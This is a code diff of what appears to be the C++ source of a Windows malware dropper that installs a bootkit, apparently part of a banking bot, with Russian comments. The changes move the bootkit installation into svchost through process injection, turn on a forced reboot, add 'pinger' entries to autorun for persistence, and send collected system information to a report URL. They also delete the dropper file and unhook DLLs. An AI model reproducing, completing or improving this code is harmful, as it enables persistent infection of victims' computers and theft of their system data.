@@ -39,6 +39,7 @@
 
 #include "BotDebug.h"
 #include "DbgRptBootkit.h"
+#include "DbgRpt.h"
 
 namespace BootkitDll
 {
@@ -84,6 +85,7 @@ CHAR FileToDelete[MAX_PATH]; //путь для удаления первоначального файла бота
 // процесса, в котором вызвана ExplorerRoutine.
 DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
 
+VOID GetPaths();
 
 BOOL SaveManifest(PCHAR FileName)
 {
@@ -105,7 +107,7 @@ BOOL SaveManifest(PCHAR FileName)
 DWORD WINAPI DeleteDropper(LPVOID) // убиваем процесс, стираем файл
 {
 	BOT::Initialize();
-
+	DebugReportInit();
 	PP_DPRINTF("DeleteDropper: started for '%s'", FileToDelete);
 	LONG i = 1;
 	
@@ -115,7 +117,6 @@ DWORD WINAPI DeleteDropper(LPVOID) // убиваем процесс, стираем файл
 	PP_DPRINTF("DeleteDropper: Starting delete cycle ...");
 	while(i++)
 	{
-
 		if (pDeleteFileA( FileToDelete ))
 			break;
 		pSleep(1025*i);
@@ -191,8 +192,8 @@ DWORD TakePrivileges()
 
 DWORD WINAPI RebootThread(void* p)
 {
-//	PP_DPRINTF("RebootThread: run MultiMethodReboot().");
-//	MultiMethodReboot();
+	PP_DPRINTF("RebootThread: run MultiMethodReboot().");
+	MultiMethodReboot();
 	return 0;
 }
 
@@ -273,7 +274,7 @@ void GetDriverUrl(char * UrlBuffer, DWORD UrlBufferSize)
 	AddURLParam(Fields, "step", "170_dr"); //170_dr таймер драйвера
 
 	PCHAR Params = Strings::GetText(Fields, "&");
-	PCHAR URL = STR::New(2, PP_REPORT_URL, Params);
+	PCHAR URL = STR::New(3, PP_REPORT_URL, "?", Params);
 	
 	PP_DPRINTF("GetDriverUrl: url='%s':%u", URL, STR::Length(URL));
 
@@ -315,18 +316,6 @@ bool SetupBootkit()
 	ULONG ret  = -1;
 	UnhookDlls();
 
-	PP_DPRINTF("ExplorerStart: doing DebugReportStep1 on start.");
-	PP_DBGRPT_FUNCTION_CALL(DebugReportStep1());
-	
-	PP_DPRINTF("ExplorerStart: doing DebugReportUpdateNtldrCheckSum on start.");
-	PP_DBGRPT_FUNCTION_CALL(DebugReportUpdateNtldrCheckSum());
-
-	PP_DPRINTF("ExplorerStart: doing sending system information.");
-	PP_DBGRPT_FUNCTION_CALL(DebugReportCreateConfigReportAndSend());
-	
-	// 110_d - запуск ExplorerStart
-	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("110_d"));
-
 	PP_DPRINTF("ExplorerStart: looking for setup dll...");
 
 	TMemoryDLL BkImage(BootkitDll::data);
@@ -337,24 +326,20 @@ bool SetupBootkit()
 		PP_DPRINTF("ExplorerStart: UID saved for bootkit.(result=%d)", uid_saved);
 
 		PP_DPRINTF("ExplorerStart: looking for setup function ....");
-		ULONG (*BkInstall)();
-		if ( BkInstall = (ULONG(*)())BkImage.GetProcAddress("BkInstall")  )
+		ULONG (*BkInstall)(BOOL);
+		if ( BkInstall = (ULONG(*)(BOOL))BkImage.GetProcAddress("BkInstall")  )
 		{
 			// 111_d - запуск установки
 			PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("111_d"));
 
 			PP_DPRINTF("ExplorerStart: setup function found 0x%X. Calling it.", BkInstall);
-			ret = BkInstall();
+			ret = BkInstall(FALSE);
 			PP_DPRINTF("ExplorerStart: setup function result = 0x%X", ret);
 
 			if (ret == ERROR_SUCCESS)
 			{
 				//112_d установка успешна
 				PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("112_d"));
-
-				PP_DPRINTF("ExplorerStart: add pinger to autorun...");
-				AddRebootPingToAutorun();
-				AddRebootPingDllToAutorun();
 			}
 
 			PP_DPRINTF("ExplorerStart: doing DebugReportStep2");
@@ -368,6 +353,13 @@ bool SetupBootkit()
 	return false;
 }
 
+DWORD WINAPI SetupBootkitInSvchost(LPVOID)
+{
+	BOT::Initialize();
+	DebugReportInit();
+	SetupBootkit();
+	return 0;
+}
 
 // Ф-ция, которая после проверок вызывает события старта в процессе Explorer,
 // что в свою очередь вызывает установку BkDll
@@ -381,8 +373,24 @@ BOOL ExplorerMain()
 	if ( (DWORD)pGetFileAttributesA(PathBkFile) == INVALID_FILE_ATTRIBUTES)
 	{
 		PP_DPRINTF("ExplorerMain: BkFile not exists. Runing ExplorerStart()");
-		if ( SetupBootkit() )
+		PP_DPRINTF("ExplorerStart: doing DebugReportStep1 on start.");
+		PP_DBGRPT_FUNCTION_CALL(DebugReportStep1());
+
+		PP_DPRINTF("ExplorerStart: doing DebugReportUpdateNtldrCheckSum on start.");
+		PP_DBGRPT_FUNCTION_CALL(DebugReportUpdateNtldrCheckSum());
+
+		PP_DPRINTF("ExplorerStart: doing sending system information.");
+		PP_DBGRPT_FUNCTION_CALL(DebugReportCreateConfigReportAndSend());
+	
+		// 110_d - запуск ExplorerStart
+		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("110_d"));
+//		if ( SetupBootkit() )
+		if( MegaJump(SetupBootkitInSvchost) )
 		{
+			pSleep(5000);
+			PP_DPRINTF("ExplorerStart: add pinger to autorun...");
+			AddRebootPingToAutorun();
+			AddRebootPingDllToAutorun();
 			ret = TRUE;
 			BkInstalledSuccess = true;
 			
@@ -443,6 +451,7 @@ BOOL ExplorerMain()
 DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 {
 	BOT::Initialize();
+	DebugReportInit();
 	// 
 	//	Cоздадим отдельный поток для удаления так как дропер может удаляться больше минуты.
 	//
@@ -1086,6 +1095,14 @@ int APIENTRY MyMain(int argc, char** argv)
 	BOT::Initialize();
 	UnhookDlls();//снимаем хуки
 	GetPaths();
+
+	DebugReportInit();
+	char statParam[256];
+	fwsprintfA pwsprintf = Get_wsprintfA();
+	char* prefix = GetNamePrefix();
+	pwsprintf( statParam, "bot.plug %s %s", prefix, PP_REPORT_URL );
+	STR::Free(prefix);
+	DebugReportSaveSettings(statParam);
 
 	// 100_d запуск дропера
 	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("100_d"));
